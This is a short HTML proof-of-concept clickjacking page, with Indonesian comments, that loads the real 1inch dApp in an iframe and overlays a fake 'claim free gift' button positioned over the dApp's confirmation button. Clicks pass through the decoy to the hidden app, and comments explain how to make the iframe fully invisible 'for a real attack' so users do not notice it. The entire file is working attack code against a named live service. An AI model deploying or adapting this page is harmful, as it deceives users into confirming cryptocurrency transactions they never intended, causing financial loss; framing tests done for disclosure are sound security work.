<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Access Control Test</title>
    <style>
        /* Container utama */
        .wrapper {
            position: relative;
            width: 500px;
            height: 700px;
            border: 2px solid #333;
        }

        /* Iframe yang memuat target (1inch dApp) */
        /* Kita buat transparan agar user tidak sadar ada dApp di bawahnya */
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0.5; /* Ubah ke 0.0 untuk serangan nyata */
            z-index: 1;
        }

        /* Elemen Umpan (Tombol Palsu) */
        /* Posisikan tepat di atas tombol konfirmasi dApp */
        .fake-ui {
            position: absolute;
            top: 450px; /* Sesuaikan dengan posisi tombol konfirmasi 1inch */
            left: 50px;
            width: 400px;
            padding: 20px;
            background: #ff453a;
            color: white;
            text-align: center;
            border-radius: 12px;
            font-weight: bold;
            pointer-events: none; /* Klik akan tembus ke iframe di bawahnya */
            z-index: 2;
        }

        .instruction {
            margin-bottom: 10px;
            font-family: sans-serif;
        }
    </style>
</head>
<body>

    <div class="instruction">
        <h3>PoC Clickjacking (Access Control)</h3>
        <p>Jika 1inch muncul di bawah, berarti celah ini terbuka.</p>
    </div>

    <div class="wrapper">
        <div class="fake-ui">
            KLIK UNTUK KLAIM HADIAH GRATIS!
        </div>

        <iframe src="https://app.1inch.io"></iframe>
    </div>

</body>
</html>
